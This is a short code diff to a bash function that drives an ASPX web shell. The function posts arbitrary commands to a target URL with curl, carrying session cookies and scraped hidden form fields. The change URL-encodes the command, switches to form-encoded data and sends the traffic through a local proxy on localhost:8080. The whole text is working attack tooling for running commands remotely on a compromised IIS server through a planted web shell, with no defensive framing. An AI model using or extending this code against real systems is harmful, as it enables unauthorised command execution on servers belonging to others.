@@ -127,13 +127,14 @@ run_aspx_shell_command() {
         echo "Command to execute is not set."
         return 1
     fi
-    local proxy_option=""
-    local hidden_inputs=$(get_iis_hidden_inputs "$target_url")
+    local proxy_option="--proxy localhost:8080"
+    local hidden_inputs=$(get_post_hidden_inputs "$target_url")
     echo $hidden_inputs
+    local txtCommand=$(urlencode "$cmd")
     curl -b $cookie_jar -c $cookie_jar $target_url \
-    -F "txtCommand=$cmd" \
-    -F "btnExecute=Execute" \
-    $hidden_inputs $proxy_option
+    -d "txtCommand=$txtCommand" \
+    -d "btnExecute=Execute" \
+    -d "$hidden_inputs" $proxy_option
 
 }
 
